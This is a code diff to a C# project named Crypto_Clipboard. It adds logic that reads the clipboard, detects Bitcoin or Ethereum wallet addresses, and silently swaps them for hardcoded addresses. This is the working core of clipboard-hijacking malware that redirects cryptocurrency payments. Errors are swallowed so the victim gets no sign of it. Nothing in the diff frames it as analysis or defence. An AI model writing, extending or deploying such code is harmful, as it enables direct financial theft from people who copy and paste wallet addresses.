@@ -50,15 +50,27 @@ namespace Crypto_Clipboard
                     Thread STAThread = new Thread(
                         delegate ()
                         {
+                            CryptoVerification cv = new CryptoVerification();
                             try
                             {
-                                System.Windows.Forms.Clipboard.SetText("Test");
+                                string text = Clipboard.GetText();
+                                string address;
+
+                                if (cv.Verify(text, CryptoTypes.BTC))
+                                {
+                                    address = CryptoAddresses.BITCOIN;
+                                    Clipboard.SetText(address);
+                                }
+                                else if (cv.Verify(text, CryptoTypes.ETH))
+                                {
+                                    address = CryptoAddresses.ETHEREUM;
+                                    Clipboard.SetText(address);
+                                }
                             }
                             catch (Exception) { }
-
                         });
 
-                    STAThread.SetApartmentState(System.Threading.ApartmentState.STA);
+                    STAThread.SetApartmentState(ApartmentState.STA);
                     STAThread.Start();
                     STAThread.Join();
 
